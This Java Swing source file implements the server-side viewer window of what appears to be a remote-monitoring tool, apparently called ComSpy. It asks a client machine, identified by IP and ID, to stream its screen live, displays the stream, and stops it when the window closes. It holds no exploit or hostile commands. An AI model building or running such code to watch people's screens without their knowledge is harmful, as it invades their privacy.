/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ui_server;

import Comman.ConnectionServer;
import Comman.KeysVer;
import static Comman.KeysVer.Args;
import Comman.LOCAL_KEYS;
import Comman.SERVER_KEYS;
import Server.Server_Screen;
import java.io.IOException;

/**
 *
 * @author abaza
 */
public class screen_monitor extends javax.swing.JInternalFrame {

    public String IP, SUUID, CUUID;
    Server_Screen ScreenMon = null;
    SERVER_KEYS Server_Var = new SERVER_KEYS();
    LOCAL_KEYS Local_Var = new LOCAL_KEYS();
    Comman.ConnectionServer Server = new ConnectionServer();
    MainControl MC = null;

    /**
     * Creates new form screen_monitor
     *
     * @param IP
     * @param CUUID
     */
    public screen_monitor(String IP, String CUUID, MainControl mm) {
        initComponents();
        this.CUUID = CUUID;
        this.IP = IP;
        this.MC = mm;
        this.SUUID = Args.get(KeysVer.Keys.SUUID);
        ScreenMon = new Server_Screen();
        init();
        OpenTask();
    }

    private void OpenTask() {
        try {
            ScreenMon.init(this.IP, Integer.parseInt(Args.get(KeysVer.Keys.MY_PORT)), Args.get(KeysVer.Keys.FKEY),jPanel1);
            ScreenMon.StartRecevedScreen(jPanel1);
            jPanel1.updateUI();
        } catch (IOException ex) {
            compy_client.ComSpy.MessageLog(ex);
        }
    }

    private void init() {
        this.setTitle(this.IP);
        String[][] Data = {
            {Server_Var.TYPE_COMMENT, Server_Var.SC_PRINT_LIVE},
            {Local_Var.TASKS_CUUID, CUUID},
            {Local_Var.TASKS_SCR_LIFE, "1"}
        };
        if (Server.DoneOrNot(Server.Contaner(Data))) {
            System.out.println("Open Screen Monitor");
        } else {
            System.out.println("Error Database in Screen Monitor");
        }

    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();

        setClosable(true);
        setIconifiable(true);
        setMaximizable(true);
        addInternalFrameListener(new javax.swing.event.InternalFrameListener() {
            public void internalFrameOpened(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameClosing(javax.swing.event.InternalFrameEvent evt) {
                formInternalFrameClosing(evt);
            }
            public void internalFrameClosed(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameIconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameDeiconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameActivated(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameDeactivated(javax.swing.event.InternalFrameEvent evt) {
            }
        });
        addComponentListener(new java.awt.event.ComponentAdapter() {
            public void componentResized(java.awt.event.ComponentEvent evt) {
                formComponentResized(evt);
            }
        });

        jPanel1.setBorder(javax.swing.BorderFactory.createEtchedBorder());

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 933, Short.MAX_VALUE)
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 677, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formInternalFrameClosing(javax.swing.event.InternalFrameEvent evt) {//GEN-FIRST:event_formInternalFrameClosing
        String[][] Data = {
            {Server_Var.TYPE_COMMENT, Server_Var.SC_PRINT_LIVE},
            {Local_Var.TASKS_CUUID, CUUID},
            {Local_Var.TASKS_SCR_LIFE, "0"}
        };
        Server.Contaner(Data);
        ScreenMon.StopRecevedScreen();
        ScreenMon = null;
        MC.jToggleButton1.setEnabled(true);
    }//GEN-LAST:event_formInternalFrameClosing

    private void formComponentResized(java.awt.event.ComponentEvent evt) {//GEN-FIRST:event_formComponentResized
        jPanel1.resize(this.getWidth(), this.getHeight());
        jPanel1.revalidate();
        jPanel1.updateUI();
    }//GEN-LAST:event_formComponentResized


    // Variables declaration - do not modify//GEN-BEGIN:variables
    public javax.swing.JPanel jPanel1;
    // End of variables declaration//GEN-END:variables
}
